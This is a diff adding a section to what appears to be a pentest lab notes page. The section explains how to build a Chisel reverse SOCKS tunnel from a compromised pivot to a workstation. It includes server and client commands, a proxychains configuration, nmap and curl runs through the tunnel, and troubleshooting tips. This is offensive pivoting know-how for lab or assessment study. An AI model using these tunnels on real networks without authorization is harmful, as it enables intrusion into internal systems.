@@ -5,6 +5,75 @@ description: "Find the saved Chisel client and server commands for building a re
 keywords: ["chisel", "reverse socks", "client", "server", "http tunnel", "1080", "pivoting"]
 ---
 
+## Build a reverse SOCKS tunnel in three places
+
+The workstation runs the Chisel server. The pivot runs the client and initiates the outbound connection. Your enumeration tool runs on the workstation and connects through the resulting SOCKS listener. These are three separate roles even when two belong to the same machine.
+
+### Start the receiving side
+
+```bash
+# Workstation; choose a port reachable from the pivot.
+./chisel server -p 8080 --reverse
+```
+
+Record the server's displayed fingerprint. Where your installed client supports fingerprint pinning, use that value with its fingerprint option so the client verifies the intended server. The Chisel transport port 8080 is not the SOCKS port used by your enumeration client.
+
+### Connect from the pivot
+
+```bash
+# Linux pivot:
+./chisel client WORKSTATION_IP:8080 R:socks
+```
+
+```powershell
+# Windows pivot, using the matching binary:
+.\chisel.exe client WORKSTATION_IP:8080 R:socks
+```
+
+Choose the binary for the pivot's platform/architecture. WORKSTATION_IP must be reachable from the pivot. Read the logs on both sides and confirm the reverse listener was created; starting a process is not proof of a live tunnel.
+
+### Point one client at the SOCKS listener
+
+Use a dedicated proxychains configuration with a single intended chain and the relevant DNS setting:
+
+```text
+strict_chain
+proxy_dns
+[ProxyList]
+socks5 127.0.0.1 1080
+```
+
+```bash
+proxychains -f ./proxychains-lab.conf curl -I http://INTERNAL_IP/
+proxychains -f ./proxychains-lab.conf nmap -sT -Pn -n -p 80,445 INTERNAL_IP
+```
+
+Start with one service already verified from the pivot. Keep broad scans for after the path works. SOCKS is a TCP application proxy; raw-packet scan modes and UDP enumeration need another approach.
+
+### Forward a single service instead
+
+```bash
+# Pivot: expose the pivot-reachable INTERNAL_IP:80 on workstation loopback:8081.
+./chisel client WORKSTATION_IP:8080 R:127.0.0.1:8081:INTERNAL_IP:80
+# Workstation:
+curl -I http://127.0.0.1:8081/
+```
+
+Choose either the single-service mapping or SOCKS according to the task. Check whether the internal service expects a hostname, TLS SNI or domain authentication after the TCP path succeeds.
+
+| Symptom | Investigate |
+| --- | --- |
+| Client cannot connect | Workstation address, listener bind, firewall, egress and transport port |
+| Server connects but cannot create reverse listener | Port already in use or reverse mode not enabled |
+| SOCKS connection fails | Wrong local SOCKS port/configuration or dead tunnel |
+| Only one internal destination fails | Pivot-to-destination routing/firewall/service |
+| IP works but hostname fails | DNS resolution location and lab resolver |
+| HTTP responds with unexpected application | Host header, scheme, port and redirects |
+
+Keep the session running while clients depend on it. Stop your tunnel processes and verify their listeners disappear during cleanup. The original recipes below remain useful for their specific lab addresses; the roles above explain which values to replace.
+
+## Existing notes and worked examples
+
 TCP/UDP tunnels over HTTP — reach an internal subnet through a compromised host.
 
 ```bash
